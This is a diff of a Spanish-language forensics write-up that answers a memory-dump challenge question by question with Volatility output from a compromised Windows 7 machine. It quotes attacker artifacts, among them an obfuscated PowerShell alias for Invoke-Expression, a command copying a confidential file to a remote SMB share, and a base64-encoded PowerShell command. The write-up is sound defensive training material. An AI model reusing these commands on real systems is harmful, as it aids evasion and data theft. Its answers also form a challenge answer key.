@@ -1,5 +1,109 @@
 
+## 1 y 2 - ¿Cuál es el sistema operativo de la máquina? y ¿Cuándo se creó el volcado de memoria?
+### Vol3
+
+```bash
+vol -f recollection.bin windows.info
+```
+
+```bash
+Volatility 3 Framework 2.26.2
+Progress:  100.00		PDB scanning finished                        
+Variable	Value
+
+Kernel Base	0xf8000285c000
+DTB	0x187000
+Symbols	file:///home/kali/.local/share/pipx/venvs/volatility3/lib/python3.13/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
+Is64Bit	True
+IsPAE	False
+layer_name	0 WindowsIntel32e
+memory_layer	1 FileLayer
+KdDebuggerDataBlock	0xf80002a3f120
+NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_
+CSDVersion	1
+KdVersionBlock	0xf80002a3f0e8
+Major/Minor	15.7601
+MachineType	34404
+KeNumberProcessors	1
+SystemTime	2022-12-19 16:07:30+00:00
+NtSystemRoot	C:\Windows
+NtProductType	NtProductWinNt
+NtMajorVersion	6
+NtMinorVersion	1
+PE MajorOperatingSystemVersion	6
+PE MinorOperatingSystemVersion	1
+PE Machine	34404
+PE TimeDateStamp	Thu Aug  2 02:18:10 2018
+```
+- **NtMajorVersion**: En Windows 7 será `6`.
+- **NtMinorVersion**: En Windows 7 será `1`.
+- **NtBuildNumber**: Aquí está la clave para saber si es SP1 o no.
+    - `7600` = Windows 7 (RTM)
+    - `7601` = Windows 7 (Service Pack 1)
+- **Symbol Table**: Verás un nombre largo (ej. `ntkrnlmp.pdb/GUID...`). Si Volatility logró descargar los símbolos, esto confirma que detectó el kernel correctamente.
+
+o 
+
+vol -f recollection.bin windows.registry.printkey --key "Software\Microsoft\Windows NT\CurrentVersion"
+(en este caso no lo reconoce)
+
+- **Respuestas:** Windows 7 y 2022-12-19 16:07:30
+
+### Vol2 
+
+```bash
+python2 vol.py -f ../recollection.bin imageinfo
+```
+
+```bash
+  Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
+                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
+                     AS Layer2 : FileAddressSpace (/home/kali/hacking/sherlocks/recollection/recollection.bin)
+                      PAE type : No PAE
+                           DTB : 0x187000L
+                          KDBG : 0xf80002a3f120L
+          Number of Processors : 1
+     Image Type (Service Pack) : 1
+                KPCR for CPU 0 : 0xfffff80002a41000L
+             KUSER_SHARED_DATA : 0xfffff78000000000L
+           Image date and time : 2022-12-19 16:07:30 UTC+0000
+     Image local date and time : 2022-12-19 22:07:30 +0600
+```
+
+
+## 3 - Después de que el atacante obtuviera acceso al equipo, copió un comando PowerShell ofuscado al portapapeles. ¿Cuál era el comando?
+
+### Vol2
+
+```bash
+python2 vol.py --profile Win7SP1x64 -f ../recollection.bin clipboard
+```
+
+```bash
+Session    WindowStation Format                         Handle Object             Data                                              
+---------- ------------- ------------------ ------------------ ------------------ ------------------
+         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''                  
+         1 WinSta0       CF_TEXT                  0x7400000000 ------------------                                                   
+         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260                                                   
+         1 WinSta0       0x0L                              0x0 ------------------           
+```
+
+- **Respuesta:** `(gv '*MDR*').naMe[3,11,2]-joIN''`
+
+## 4 - El atacante copió el comando ofuscado para utilizarlo como alias de un cmdlet de PowerShell. ¿Cuál es el nombre del cmdlet?
+
+[Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow - Securonix](https://www.securonix.com/blog/hiding-the-powershell-execution-flow/)
+
+**Respuesta:** Invoke-Expression
+
+## 5 - Se ejecutó un comando CMD para intentar extraer un archivo. ¿Cuál es la línea de comando completa?
+
+### Vol2
+
+```bash
 python2 vol.py --profile Win7SP1x64 -f ../recollection.bin consoles
+```
+
 ```powershell
 ConsoleProcess: conhost.exe Pid: 3524
 Console: 0xff9d6200 CommandHistorySize: 50
@@ -166,95 +270,79 @@ PS C:\Users\user>
 ```
 
 
+**Respuesta:** `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`
+
+## 6 - Tras ejecutar el comando anterior, ¿nos puede indicar si el archivo se ha filtrado correctamente?
+
+```powershell
+...
+PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
+\pulice\pass.txt                                                                
+The network path was not found.  
+...
+```
+**Respuesta:** No
+
+## 7 - El atacante intentó crear un archivo readme. ¿Cuál era la ruta completa del archivo?
+
+```
+PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"      
+The term '??????????????????????????????' is not recognized as the name of a cmdlet, function, script file, or operable 
+```
+
+```bash
+echo ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi | base64 -d
+echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"%       
+```
+
+**Respuesta:** `C:\Users\Public\Office\readme.txt`
+
+## 8 - ¿Cuál era el nombre de host del equipo?
+
+```powershell
+PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
+iex                                                                                                                     
+PS C:\Users\user> net users                                                                                             
+                                                                                                                        
+User accounts for \\USER-PC           
+```
+
+**Respuesta:** `USER-PC `
+
+## 9 - ¿Cuántas cuentas de usuario había en la máquina?
+
+```powershell
+User accounts for \\USER-PC                                                                                             
+                                                                                                                        
+-------------------------------------------------------------------------------                                         
+Administrator            Guest                    user                                                                  
+The command completed successfully.                         
+```
+
+**Respuesta:** 3
+
+## 10 - En la carpeta «\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge» había algunas subcarpetas en las que se encontraba un archivo llamado passwords.txt. ¿Cuál era la ubicación/ruta completa del archivo?
+
+### Vol3 
+
+```bash
+vol -f recollection.bin windows.filescan.FileScan | grep passwords.txt
+```
+
+```
+0x11fc10070100.0\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
+```
+
+No es la respuesta que pide la pregunta.
+### Vol2 
+
+```bash
 python2 vol.py --profile Win7SP1x64 -f ../recollection.bin filescan | grep password.txt
+```
+
 ```powershell
 \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
 ```
 
-
-## 1 y 2 - ¿Cuál es el sistema operativo de la máquina? y ¿Cuándo se creó el volcado de memoria?
-### Vol3
-
-vol -f recollection.bin windows.info
-```bash
-Volatility 3 Framework 2.26.2
-Progress:  100.00		PDB scanning finished                        
-Variable	Value
-
-Kernel Base	0xf8000285c000
-DTB	0x187000
-Symbols	file:///home/kali/.local/share/pipx/venvs/volatility3/lib/python3.13/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
-Is64Bit	True
-IsPAE	False
-layer_name	0 WindowsIntel32e
-memory_layer	1 FileLayer
-KdDebuggerDataBlock	0xf80002a3f120
-NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_
-CSDVersion	1
-KdVersionBlock	0xf80002a3f0e8
-Major/Minor	15.7601
-MachineType	34404
-KeNumberProcessors	1
-SystemTime	2022-12-19 16:07:30+00:00
-NtSystemRoot	C:\Windows
-NtProductType	NtProductWinNt
-NtMajorVersion	6
-NtMinorVersion	1
-PE MajorOperatingSystemVersion	6
-PE MinorOperatingSystemVersion	1
-PE Machine	34404
-PE TimeDateStamp	Thu Aug  2 02:18:10 2018
-```
-- **NtMajorVersion**: En Windows 7 será `6`.
-- **NtMinorVersion**: En Windows 7 será `1`.
-- **NtBuildNumber**: Aquí está la clave para saber si es SP1 o no.
-    - `7600` = Windows 7 (RTM)
-    - `7601` = Windows 7 (Service Pack 1)
-- **Symbol Table**: Verás un nombre largo (ej. `ntkrnlmp.pdb/GUID...`). Si Volatility logró descargar los símbolos, esto confirma que detectó el kernel correctamente.
-
-o 
-
-vol -f recollection.bin windows.registry.printkey --key "Software\Microsoft\Windows NT\CurrentVersion"
-(en este caso no lo reconoce)
-
-- **Respuestas:** Windows 7 y 2022-12-19 16:07:30
-
-### Vol2 
-
-python2 vol.py -f ../recollection.bin imageinfo
-```bash
-  Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
-                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
-                     AS Layer2 : FileAddressSpace (/home/kali/hacking/sherlocks/recollection/recollection.bin)
-                      PAE type : No PAE
-                           DTB : 0x187000L
-                          KDBG : 0xf80002a3f120L
-          Number of Processors : 1
-     Image Type (Service Pack) : 1
-                KPCR for CPU 0 : 0xfffff80002a41000L
-             KUSER_SHARED_DATA : 0xfffff78000000000L
-           Image date and time : 2022-12-19 16:07:30 UTC+0000
-     Image local date and time : 2022-12-19 22:07:30 +0600
-```
-
-
-## 3 - Después de que el atacante obtuviera acceso al equipo, copió un comando PowerShell ofuscado al portapapeles. ¿Cuál era el comando?
-
-### Vol2
-
-python2 vol.py --profile Win7SP1x64 -f ../recollection.bin clipboard
-```bash
-Session    WindowStation Format                         Handle Object             Data                                              
----------- ------------- ------------------ ------------------ ------------------ ------------------
-         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''                  
-         1 WinSta0       CF_TEXT                  0x7400000000 ------------------                                                   
-         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260                                                   
-         1 WinSta0       0x0L                              0x0 ------------------           
-```
-
-- **Respuesta:** `(gv '*MDR*').naMe[3,11,2]-joIN''`
-
-## 4 - El atacante copió el comando ofuscado para utilizarlo como alias de un cmdlet de PowerShell. ¿Cuál es el nombre del cmdlet?
-
-[Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow - Securonix](https://www.securonix.com/blog/hiding-the-powershell-execution-flow/)
+**Respuesta:**`\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`
 
